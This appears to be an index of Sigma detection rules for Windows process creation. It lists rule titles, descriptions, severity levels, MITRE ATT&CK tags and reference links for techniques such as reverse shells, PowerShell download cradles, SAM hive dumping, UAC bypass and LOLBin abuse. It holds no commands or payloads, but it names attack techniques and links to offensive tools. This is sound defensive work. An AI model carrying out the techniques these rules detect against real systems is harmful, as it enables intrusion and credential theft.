* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-4---gotoassist-files-detected-test-on-windows

    
### CrackMapExec Command Execution
    
    Detect various execution methods of the CrackMapExec pentesting framework

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1047
    * MITRE: attack.t1053
    * MITRE: attack.t1059.003
    * MITRE: attack.t1059.001
    * MITRE: attack.s0106
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_crackmapexec_execution.yml
* https://github.com/byt3bl33d3r/CrackMapExec

    
### Suspicious WMI Execution
    
    Detects WMI executing suspicious commands

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1047
    * MITRE: car.2016-03-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_wmi_execution.yml
* https://digital-forensics.sans.org/blog/2010/06/04/wmic-draft/

* https://www.hybrid-analysis.com/sample/4be06ecd234e2110bd615649fe4a6fa95403979acf889d7e45a78985eb50acf9?environmentId=1

* https://blog.malwarebytes.com/threat-analysis/2016/04/rokku-ransomware/

    
### Squirrel Lolbin
    
    Detects Possible Squirrel Packages Manager as Lolbin

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_squirrel_lolbin.yml
* http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/

* http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/

    
### Obfuscated Command Line Using Special Unicode Characters
    
    Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_char_in_cmd.yml
* https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md#atomic-test-6---dlp-evasion-via-sensitive-data-in-vba-macro-over-http

    
### SOURGUM Actor Behaviours
    
    Suspicious behaviours related to an actor tracked by Microsoft as SOURGUM

    * Level: high
    * MITRE: attack.t1546
    * MITRE: attack.t1546.015
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_sourgrum.yml
* https://www.virustotal.com/gui/file/c299063e3eae8ddc15839767e83b9808fd43418dc5a1af7e4f44b97ba53fbd3d/detection

* https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/SOURGUM_IOC.yaml

* https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/

    
### Suspicious Scan Loop Network
    
    Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059
    * MITRE: attack.discovery
    * MITRE: attack.t1018
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_network_scan_loop.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md

* https://ss64.com/nt/for.html

* https://ss64.com/ps/foreach-object.htmll

    
### Grabbing Sensitive Hives via Reg Utility
    
    Dump sam, system or security hives using REG.exe utility

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.004
    * MITRE: attack.t1003.005
    * MITRE: car.2013-07-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_grabbing_sensitive_hives_via_reg.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

* https://eqllib.readthedocs.io/en/latest/analytics/aed95fc6-5e3f-49dc-8b35-06508613f979.html

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md

* https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation

    
### Control Panel Items
    
    Detects the malicious use of a control panel item

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.002
    * MITRE: attack.persistence
    * MITRE: attack.t1546
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_control_panel_item.yml
* https://attack.mitre.org/techniques/T1196/

* https://ired.team/offensive-security/code-execution/code-execution-through-control-panel-add-ins

    
### Mavinject Inject DLL Into Running Process
    
    Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.collection
    * MITRE: attack.t1218.013
    * MITRE: attack.t1056.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_creation_mavinject_dll.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.004/T1056.004.md

* https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e

    
### DNS RCE CVE-2020-1350
    
    Detects exploitation of DNS RCE bug reported in CVE-2020-1350 by the detection of suspicious sub process

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_exploit_cve_2020_1350.yml
* https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/

* https://blog.menasec.net/2019/02/threat-hunting-24-microsoft-windows-dns.html

    
### Winword LOLBIN Usage
    
    Winword can be abused as a LOLBIN to download arbitary file or load arbitary DLLs

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_winword_lolbin.yml
* https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/

* https://github.com/D4Vinci/One-Lin3r/blob/master/one_lin3r/core/liners/windows/cmd/dll_loader_word.py

    
### Hiding Files with Attrib.exe
    
    Detects usage of attrib.exe to hide files from users.

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_attrib_hiding_files.yml
    
### DNS ServerLevelPluginDll Install
    
    Detects the installation of a plugin DLL via ServerLevelPluginDll parameter in Registry, which can be used to execute code in context of the DNS server (restart required)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.002
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_dns_serverlevelplugindll.yml
* https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83

    
### Invoke-Obfuscation RUNDLL LAUNCHER
    
    Detects Obfuscated Powershell via RUNDLL LAUNCHER

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_via_rundll.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### PowerShell SAM Copy
    
    Detects suspicious PowerShell scripts accessing SAM hives

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_powershell_sam_access.yml
* https://twitter.com/splinter_code/status/1420546784250769408

    
### Suspicious Shells Spawn by Java
    
    Detects suspicious shell spawn from Java host process (e.g. log4j exploitation)

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_shell_spawn_by_java.yml
    
### Suspicious Windows Update Agent Empty Cmdline
    
    Detects suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_wuauclt_cmdline.yml
* https://redcanary.com/blog/blackbyte-ransomware/

    
### MSHTA Spwaned by SVCHOST
    
    Detects MSHTA.EXE spwaned by SVCHOST as seen in LethalHTA and described in report

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lethalhta.yml
* https://codewhitesec.blogspot.com/2018/07/lethalhta.html

    
### Suspicious RDP Redirect Using TSCON
    
    Detects a suspicious RDP session redirect using tscon.exe

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1563.002
    * MITRE: attack.t1021.001
    * MITRE: car.2013-07-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_tscon_rdp_redirect.yml
* http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html

* https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6

    
### Proxy Execution via Wuauclt
    
    Detects the use of the Windows Update Client binary (wuauclt.exe) to proxy execute code.

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_proxy_execution_wuauclt.yml
* https://dtm.uk/wuauclt/

* https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/

    
### Bypass UAC via Fodhelper.exe
    
    Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_fodhelper.yml
* https://eqllib.readthedocs.io/en/latest/analytics/e491ce22-792f-11e9-8f5c-d46d6d62a49e.html

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1088/T1088.md

    
### TAIDOOR RAT DLL Load
    
    Detects specific process characteristics of Chinese TAIDOOR RAT malware load

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1055.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_taidoor.yml
* https://us-cert.cisa.gov/ncas/analysis-reports/ar20-216a

    
### Suspicious PowerShell Download and Execute Pattern
    
    Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml
* https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70

    
### Suspicious Minimized MSEdge Start
    
    Detects the suspicious minimized start of MsEdge browser, which can be used to download files from the Internet

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_msedge_minimized_download.yml
* https://twitter.com/mrd0x/status/1478234484881436672?s=12

    
### Registry Disabling LSASS PPL
    
    Detects reg command lines that disables PPL on the LSA process

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_reg_lsass_ppl.yml
* https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/

    
### Microsoft Outlook Product Spawning Windows Shell
    
    Detects a Windows command and scripting interpreter executable started from Microsoft Outlook

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_outlook_shell.yml
* https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100

* https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html

    
### XORDump Use
    
    Detects suspicious use of XORDump process memory dumping utility

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_xordump.yml
* https://github.com/audibleblink/xordump

    
### Suspicious Shells Spawn by WinRM
    
    Detects suspicious shell spawn from WinRM host process

    * Level: high
    * MITRE: attack.t1190
    * MITRE: attack.initial_access
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_shell_spawn_from_winrm.yml
    
### Suspicious Execution of Systeminfo
    
    Use of systeminfo to get information

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1082
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_systeminfo.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-1---system-information-discovery

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo

    
### Suspicious OfflineScannerShell.exe Execution From Another Folder
    
    Use OfflineScannerShell.exe to execute mpclient.dll library in the current working directory

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbas_offlinescannershell.yml
* https://lolbas-project.github.io/lolbas/Binaries/OfflineScannerShell/

    
### Too Long PowerShell Commandlines
    
    Detects Too long PowerShell command lines

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_long_powershell_commandline.yml
* https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse

    
### Abusing Windows Telemetry For Persistence
    
    Windows telemetry makes use of the binary CompatTelRunner.exe to run a variety of commands and perform the actual telemetry collections. This binary was created to be easily extensible, and to that end, it relies on the registry to instruct on which commands to run. The problem is, it will run any arbitrary command without restriction of location or type.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.persistence
    * MITRE: attack.t1112
    * MITRE: attack.t1053
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_abusing_windows_telemetry_for_persistence.yml
* https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/

    
### Suspicious Redirection to Local Admin Share
    
    Detects a suspicious output redirection to the local admins share as often found in malicious scripts or hacktool stagers

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_redir_local_admin_share.yml
* https://www.microsoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/

    
### New Service Creation
    
    Detects creation of a new service.

    * Level: low
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_new_service_creation.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md

    
### Suspicious ConfigSecurityPolicy Execution
    
    Upload file, credentials or data exfiltration with Binary part of Windows Defender

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1567
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbas_configsecuritypolicy.yml
* https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/

    
### Mounted Share Deleted
    
    Detects when when a mounted share is removed. Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_mounted_share_deletion.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.005/T1070.005.md

    
### Use of PktMon.exe
    
    Tools to Capture Network Packets on the windows 10 with October 2018 Update or later.

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1040
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbin_pktmon.yml
* https://lolbas-project.github.io/lolbas/Binaries/Pktmon/

    
### Suspicious Debugger Registration Cmdline
    
    Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor).

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1546.008
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_install_reg_debugger_backdoor.yml
* https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/

    
### VMToolsd Suspicious Child Process
    
    Detects suspicious child process creations of VMware Tools process which may indicate persistence setup

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.persistence
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_vmtoolsd_susp_child_process.yml
* https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/

    
### SMB Relay Attack Tools
    
    Detects different hacktools used for relay attacks on Windows for privilege escalation

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1557.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_tools_relay_attacks.yml
* https://attack.mitre.org/techniques/T1557/001/

* https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

* https://pentestlab.blog/2017/04/13/hot-potato/

* https://github.com/ohpe/juicy-potato

* https://hunter2.gitbook.io/darthsidious/other/war-stories/domain-admin-in-30-minutes

* https://hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire

    
### Execute Files with Msdeploy.exe
    
    Detects file execution using the msdeploy.exe lolbin

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_msdeploy.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msdeploy.yml

* https://twitter.com/pabraeken/status/995837734379032576

* https://twitter.com/pabraeken/status/999090532839313408

    
### WMI Backdoor Exchange Transport Agent
    
    Detects a WMI backdoor in Exchange Transport Agents via WMI event filters

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1546.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_wmi_backdoor_exchange_transport_agent.yml
* https://twitter.com/cglyer/status/1182389676876980224

* https://twitter.com/cglyer/status/1182391019633029120

    
### Abusable Invoke-ATHRemoteFXvGPUDisablementCommand
    
    RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_athremotefxvgpudisablementcommand.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md

* https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1

    
### Dumping Process via Sqldumper.exe
    
    Detects process dump via legitimate sqldumper.exe binary

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_sqldumper_activity.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqldumper.yml

* https://twitter.com/countuponsec/status/910977826853068800

* https://twitter.com/countuponsec/status/910969424215232518

* https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/

    
### Powershell Reverse Shell Connection
    
    Detects the Nishang Invoke-PowerShellTcpOneLine reverse shell

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_reverse_shell_connection.yml
* https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/

* https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/

    
### PowerShell Web Download
    
    Detects suspicious ways to download files or content using PowerShell

    * Level: medium
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_powershell_download_cradles.yml
* https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/main/Download-Cradles.cmd

    
### Default PowerSploit and Empire Schtasks Persistence
    
    Detects the creation of a schtask via PowerSploit or Empire Default Configuration.

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.s0111
    * MITRE: attack.g0022
    * MITRE: attack.g0060
    * MITRE: car.2013-08-001
    * MITRE: attack.t1053.005
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powersploit_empire_schtasks.yml
* https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1

* https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/userland/schtasks.py

* https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/elevated/schtasks.py

    
### Reg Add RUN Key
    
    Detects suspicious command line reg.exe tool adding key to RUN key in Registry

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_reg_add_run_key.yml
* https://app.any.run/tasks/9c0f37bc-867a-4314-b685-e101566766d7/

* https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys

    
### Bypass UAC via WSReset.exe
    
    Identifies use of WSReset.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_wsreset.yml
* https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html

    
### Suspicious Powershell No File or Command
    
    Detects suspicious powershell execution that ends with a common flag instead of a command or a filename to execute (could be a sign of implicit execution that uses files in WindowsApps directory)

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.persistence
    * MITRE: attack.t1053.005
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_schtasks_powershell_windowsapps_execution.yml
* https://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/

    
### Arbitrary Shell Command Execution Via Settingcontent-Ms
    
    The .SettingContent-ms file type was introduced in Windows 10 and allows a user to create "shortcuts" to various Windows 10 setting pages. These files are simply XML and contain paths to various Windows 10 settings binaries.

    * Level: medium
    * MITRE: attack.t1204
    * MITRE: attack.t1566.001
    * MITRE: attack.execution
    * MITRE: attack.initial_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/process_creation_win_arbitrary_shell_execution_via_settingcontent.yml
* https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39

    
### Exploiting SetupComplete.cmd CVE-2019-1378
    
    Detects exploitation attempt of privilege escalation vulnerability via SetupComplete.cmd and PartnerSetupComplete.cmd described in CVE-2019-1378

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1068
    * MITRE: attack.execution
    * MITRE: attack.t1059.003
    * MITRE: attack.t1574
    * MITRE: cve.2019.1378
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_exploit_cve_2019_1378.yml
* https://www.embercybersecurity.com/blog/cve-2019-1378-exploiting-an-access-control-privilege-escalation-vulnerability-in-windows-10-update-assistant-wua

    
### Disable or Delete Windows Eventlog
    
    Detects command that is used to disable or delete Windows eventlog via logman Windows utility

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    * MITRE: attack.t1070.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_disable_eventlog.yml
* https://twitter.com/0gtweet/status/1359039665232306183?s=21

* https://ss64.com/nt/logman.html

    
### Suspicious File Characteristics Due to Missing Fields
    
    Detects Executables in the Downloads folder without FileVersion,Description,Product,Company likely created with py2exe

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_file_characteristics.yml
* https://securelist.com/muddywater/88059/

* https://www.virustotal.com/#/file/276a765a10f98cda1a38d3a31e7483585ca3722ecad19d784441293acf1b7beb/detection

    
### Usage of Sysinternals Tools
    
    Detects the usage of Sysinternals Tools due to accepteula key being added to Registry

    * Level: low
    * MITRE: attack.resource_development
    * MITRE: attack.t1588.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_sysinternals_eula_accepted.yml
* https://twitter.com/Moti_B/status/1008587936735035392

    
### Cmd.exe CommandLine Path Traversal
    
    detects the usage of path traversal in cmd.exe indicating possible command/argument confusion/hijacking

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_commandline_path_traversal.yml
* https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/

* https://twitter.com/Oddvarmoe/status/1270633613449723905

    
### NotPetya Ransomware Activity
    
    Detects NotPetya ransomware activity in which the extracted passwords are passed back to the main module via named pipe, the file system journal of drive C is deleted and windows eventlogs are cleared using wevtutil

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    * MITRE: attack.t1070.001
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: car.2016-04-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_malware_notpetya.yml
* https://securelist.com/schroedingers-petya/78870/

* https://www.hybrid-analysis.com/sample/64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1?environmentId=100

    
### Suspicious Certreq Command to Download
    
    Detects a suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_certreq_download.yml
* https://lolbas-project.github.io/lolbas/Binaries/Certreq/

    
### RunDLL32 Spawning Explorer
    
    Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon, often observes Gamarue spawning the explorer.exe process in an unusual way

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_spawn_explorer.yml
* https://redcanary.com/blog/intelligence-insights-november-2021/

    
### OpenWith.exe Executes Specified Binary
    
    The OpenWith.exe executes other binary

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_openwith.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Openwith.yml

* https://twitter.com/harr0ey/status/991670870384021504

    
### Certutil Encode
    
    Detects suspicious a certutil command that used to encode files, which is sometimes used for data exfiltration

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_certutil_encode.yml
* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil

* https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/

    
### Suspicious Dosfuscation Character in Commandline
    
    Posssible Payload Obfuscation

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_cmd_dosfuscation.yml
* https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf

    
### Trickbot Malware Activity
    
    Detects Trickbot malware process tree pattern in which rundll32.exe is parent of wermgr.exe

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1559
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_malware_trickbot_wermgr.yml
* https://twitter.com/swisscom_csirt/status/1331634525722521602?s=20

